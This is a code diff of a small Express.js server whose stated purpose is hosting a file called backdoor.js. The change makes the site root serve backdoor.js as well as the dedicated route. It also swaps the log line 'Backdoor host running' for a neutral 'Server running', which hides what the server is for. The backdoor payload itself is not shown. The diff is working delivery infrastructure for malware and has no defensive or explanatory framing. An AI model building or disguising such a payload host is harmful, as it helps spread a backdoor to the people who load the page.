@@ -1,27 +1,23 @@
 const express = require('express');
-const path = require('path');
 const app = express();
-const PORT = process.env.PORT || 3000; // Railway uses PORT env
+const PORT = process.env.PORT || 3000;
 
-// Serve static files
-app.use(express.static(__dirname));
-
-// Root - serve index.html
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Backdoor endpoint
+// Serve backdoor.js as static file
 app.get('/backdoor.js', (req, res) => {
-    res.sendFile(path.join(__dirname, 'backdoor.js'));
+    res.sendFile(__dirname + '/backdoor.js');
 });
 
-// Railway health check
+// Root also serves backdoor.js
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/backdoor.js');
+});
+
+// Health check
 app.get('/health', (req, res) => {
-    res.status(200).send('OK');
+    res.send('OK');
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Backdoor host running on port ${PORT}`);
+    console.log(`✅ Server running on port ${PORT}`);
     console.log(`📄 /backdoor.js`);
 });
